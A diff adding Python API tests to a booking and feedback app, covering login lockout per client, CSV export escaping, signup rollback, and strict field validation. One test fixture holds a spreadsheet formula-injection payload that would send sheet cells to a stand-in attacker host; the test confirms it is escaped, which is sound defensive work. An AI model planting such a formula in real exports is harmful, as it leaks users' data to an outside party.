@@ -378,3 +378,80 @@ def test_feedback_log_decisions_and_csv(owner, admin):
         "https://github.com/example/pull/1",
         "Much better",
     ]
+
+
+# Review fixes (#38)
+
+
+def test_one_client_cannot_lock_the_team_out(env):
+    with TestClient(app, headers=APP_HEADERS) as c:
+        attacker = {"X-Forwarded-For": "203.0.113.7"}
+        for _ in range(5):
+            c.post("/api/admin/login", json={"password": "wrong"}, headers=attacker)
+        r = c.post("/api/admin/login", json={"password": ADMIN_PASSWORD}, headers=attacker)
+        assert r.status_code == 429  # that client is locked
+        team = {"X-Forwarded-For": "198.51.100.2"}
+        r = c.post("/api/admin/login", json={"password": ADMIN_PASSWORD}, headers=team)
+        assert r.status_code == 200  # everyone else still gets in
+
+
+def test_feedback_csv_cannot_run_formulas_in_a_spreadsheet(owner, admin):
+    send(owner, text='=IMPORTXML("https://evil.example/?"&A1:H50,"//a")', person_name="+Doctor")
+    rows = list(csv.reader(io.StringIO(admin.get("/api/admin/feedback.csv").text)))
+    assert rows[1][2].startswith("'=IMPORTXML")
+    assert rows[1][1].startswith("Usage Business 1 — +Doctor")  # inside a cell, harmless
+
+
+def test_a_failed_signup_is_fully_undone(env, monkeypatch, raw):
+    from src.api import onboarding
+
+    real = onboarding.tenancy.get
+    monkeypatch.setattr(onboarding.tenancy, "get", lambda *a: (_ for _ in ()).throw(RuntimeError()))
+    with TestClient(app, headers=APP_HEADERS, raise_server_exceptions=False) as c:
+        body = {
+            "user": {"name": "Owner", "email": "undo@example.com", "password": "another pass"},
+            "business": {
+                "template": "clinic",
+                "name": "Undo Clinic",
+                "address": "1 Test Road",
+                "hours": [["09:00", "19:00"]],
+                "owner_whatsapp": "90000 00488",
+                "consent": True,
+            },
+            "details": {"doctors": [{"name": "Dr. Test"}]},
+        }
+        assert c.post("/api/signup", json=body).status_code == 500
+        assert raw.execute("SELECT COUNT(*) FROM tenants WHERE is_demo = 0").fetchone()[0] == 0
+        monkeypatch.setattr(onboarding.tenancy, "get", real)
+        assert c.post("/api/signup", json=body).status_code == 200  # the retry isn't refused
+
+
+def test_a_failed_count_never_fails_the_login(owner, raw):
+    with raw:
+        raw.execute("DROP TABLE events")  # every event write now fails
+    owner.post("/api/logout")
+    r = owner.post("/api/login", json={"email": "u1@example.com", "password": "another pass"})
+    assert r.status_code == 200 and owner.get("/api/me").status_code == 200
+
+
+def test_only_a_real_booking_status_change_is_counted(owner):
+    tid = tid_of(owner)
+    walk_in = {"doctor_id": "dr-test", "date": "2026-10-28", "time": "11:00", "name": "Walk In"}
+    bid = owner.post("/api/desk/bookings", json=walk_in).json()["id"]
+    for _ in range(2):
+        owner.post(f"/api/desk/bookings/{bid}/status", json={"status": "arrived"})
+    assert counts(tid)["booking_status"] == 1
+
+
+@pytest.mark.parametrize(
+    "change, field",
+    [
+        ({"decision": "shipped", "shipped_on": "20261115"}, "shipped_on"),
+        ({"decision": "shipped", "shipped_on": "2026-W46-1"}, "shipped_on"),
+        ({"decision": "shipped", "evidence_url": "http://example.com/x"}, "evidence_url"),
+    ],
+)
+def test_decision_fields_are_strict(owner, admin, change, field):
+    fid = send(owner).json()["id"]
+    r = admin.put(f"/api/admin/feedback/{fid}", json=change)
+    assert r.status_code == 422 and field in r.json()["fields"]
